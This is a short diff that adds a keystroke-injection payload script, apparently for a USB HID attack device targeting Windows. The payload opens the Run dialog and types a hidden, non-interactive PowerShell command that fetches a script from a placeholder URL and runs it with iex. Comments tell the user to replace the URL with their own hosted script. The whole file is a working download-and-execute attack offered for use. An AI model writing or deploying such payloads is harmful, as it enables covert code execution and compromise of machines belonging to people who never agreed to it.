@@ -1,0 +1,13 @@
+REM --- target: windows ---
+REM --- wait unitl host has done all its initializations ---
+REM --- allow user to prevent payload execution by tapping CAPSLOCK during insertion ---
+WAITFOR_INIT
+ALLOW_EXIT
+
+REM --- execute powershell script hosted on a web server of your choice ---
+REM --- you MUST replace URL_OF_YOUR_SCRIPT_HERE with an actual URL for this to work ---
+REM --- you may need to add or change parameters in that URL, eg set ?dl=1 or &dl=1 ---
+GUI r
+DELAY 100
+STRING powershell -noP -wind hidden -nonI $script = iwr \"URL_OF_YOUR_SCRIPT_HERE\"; iex $script
+ENTER
